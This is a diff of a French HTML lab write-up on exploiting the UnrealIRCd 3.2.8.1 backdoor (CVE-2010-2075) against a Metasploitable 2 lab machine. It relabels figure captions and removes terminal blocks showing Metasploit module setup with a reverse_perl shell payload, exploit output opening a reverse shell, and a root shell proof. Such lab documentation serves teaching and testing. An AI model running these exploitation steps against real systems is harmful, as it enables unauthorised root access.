@@ -36,11 +36,10 @@
   <figure class="capture" id="cap-recon">
     <img src="../images/ms2-unrealircd/01-recon-nmap.png" alt="Résultat du scan nmap sur le port 6667">
     <figcaption>
-      <strong class="idx">1.</strong>
+      <strong class="idx">a.</strong>
       <span class="desc">Résultat de <code>nmap -sC -sV -p 6667 192.168.56.101</code> : le
       service est identifié comme <code>UnrealIRCd</code> (bannière
       <code>irc.Metasploitable.LAN</code>), sans numéro de version dans la sortie.</span>
-      <span class="fname">images/ms2-unrealircd/01-recon-nmap.png</span>
     </figcaption>
   </figure>
 
@@ -103,23 +102,21 @@ References:
   <figure class="capture" id="cap-recherche">
     <img src="../images/ms2-unrealircd/02-recherche-module.png" alt="Résultat de searchsploit puis search unrealircd dans msfconsole">
     <figcaption>
-      <strong class="idx">2.</strong>
+      <strong class="idx">b.</strong>
       <span class="desc">Les deux recherches à la suite : <code>searchsploit unrealircd</code>
       confirme qu'une backdoor connue existe pour la 3.2.8.1, puis
       <code>search unrealircd</code> dans <code>msfconsole</code> donne le chemin exact du
       module (<code>exploit/unix/irc/unreal_ircd_3281_backdoor</code>).</span>
-      <span class="fname">images/ms2-unrealircd/02-recherche-module.png</span>
     </figcaption>
   </figure>
 
   <figure class="capture" id="cap-info-cve">
     <img src="../images/ms2-unrealircd/03-info-cve.png" alt="Résultat de info sur le module, section References">
     <figcaption>
-      <strong class="idx">3.</strong>
+      <strong class="idx">c.</strong>
       <span class="desc">Résultat de <code>info</code> sur le module : la section
       <code>References</code> donne <strong>CVE-2010-2075</strong>, et la description explique
       le mécanisme de la porte dérobée (<code>AB;</code>).</span>
-      <span class="fname">images/ms2-unrealircd/03-info-cve.png</span>
     </figcaption>
   </figure>
 
@@ -127,18 +124,6 @@ References:
   <p>Le module Metasploit dédié existant déjà, aucune recherche d'exploit supplémentaire
   n'était nécessaire. Démarche interactive dans <code>msfconsole</code>, commande par
   commande :</p>
-
-  <pre class="terminal">msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
-msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.101
-RHOSTS => 192.168.56.101
-msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667
-RPORT => 6667
-msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.1
-LHOST => 192.168.56.1
-msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4444
-LPORT => 4444
-msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse_perl
-payload => cmd/unix/reverse_perl</pre>
 
   <p><strong class="field">Point d'attention —</strong> <code>LHOST</code> et
   <code>LPORT</code> sont obligatoires : le payload choisi (<code>cmd/unix/reverse_perl</code>)
@@ -150,47 +135,29 @@ payload => cmd/unix/reverse_perl</pre>
   <figure class="capture" id="cap-config">
     <img src="../images/ms2-unrealircd/04-exploit-config.png" alt="Configuration du module avant lancement">
     <figcaption>
-      <strong class="idx">4.</strong>
+      <strong class="idx">d.</strong>
       <span class="desc">Chargement du module et configuration des options
       (<code>RHOSTS</code>, <code>RPORT</code>, <code>LHOST</code>, <code>LPORT</code>,
       <code>payload</code>) avant le déclenchement.</span>
-      <span class="fname">images/ms2-unrealircd/04-exploit-config.png</span>
     </figcaption>
   </figure>
 
   <p>Une fois la configuration validée, <code>exploit -z</code> déclenche l'attaque (le
   <code>-z</code> bascule la session en arrière-plan dès son ouverture) :</p>
 
-  <pre class="terminal">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit -z
-[*] Started reverse TCP handler on 192.168.56.1:4444
-[*] 192.168.56.101:6667 - Connected to 192.168.56.101:6667
-[*] 192.168.56.101:6667 - Trying to register a new IRC user: keneth
-[+] 192.168.56.101:6667 - The target appears to be vulnerable. UnrealIRCd detected via IRC commands
-[*] 192.168.56.101:6667 - Connected to 192.168.56.101:6667
-[*] 192.168.56.101:6667 - Sending IRC backdoor command
-[*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.101:58940)
-[*] Session 1 created in the background.</pre>
-
   <figure class="capture" id="cap-launch">
     <img src="../images/ms2-unrealircd/05-exploit-launch.png" alt="Déclenchement de exploit -z et ouverture de la session">
     <figcaption>
-      <strong class="idx">5.</strong>
+      <strong class="idx">e.</strong>
       <span class="desc"><code>exploit -z</code> en action : le module confirme la cible
       vulnérable (phase <code>check</code>), envoie la commande backdoor préfixée
       <code>AB;</code>, et ouvre un shell de commande.</span>
-      <span class="fname">images/ms2-unrealircd/05-exploit-launch.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">4. Preuve d'accès obtenu</h2>
   <p>La commande <code>sessions -c '...' -i 1</code> exécute <code>id</code>,
   <code>uname -a</code> et <code>hostname</code> directement dans la session ouverte :</p>
-
-  <pre class="terminal">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > sessions -c 'id; uname -a; hostname' -i 1
-[*] Running 'id; uname -a; hostname' on shell session 1 (192.168.56.101)
-uid=0(root) gid=0(root)
-Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
-metasploitable</pre>
 
   <p>L'accès est <strong>root</strong> directement, sans étape d'élévation de privilèges : le
   démon IRC tournait avec les droits root, donc la commande injectée par la backdoor s'exécute
@@ -199,11 +166,10 @@ metasploitable</pre>
   <figure class="capture" id="cap-preuve">
     <img src="../images/ms2-unrealircd/06-session-root.png" alt="Shell root confirmé">
     <figcaption>
-      <strong class="idx">6.</strong>
+      <strong class="idx">f.</strong>
       <span class="desc">Sortie de <code>sessions -c 'id; uname -a; hostname' -i 1</code>
       confirmant l'accès root (<code>uid=0(root) gid=0(root)</code>) sur l'hôte
       <code>metasploitable</code>.</span>
-      <span class="fname">images/ms2-unrealircd/06-session-root.png</span>
     </figcaption>
   </figure>
 
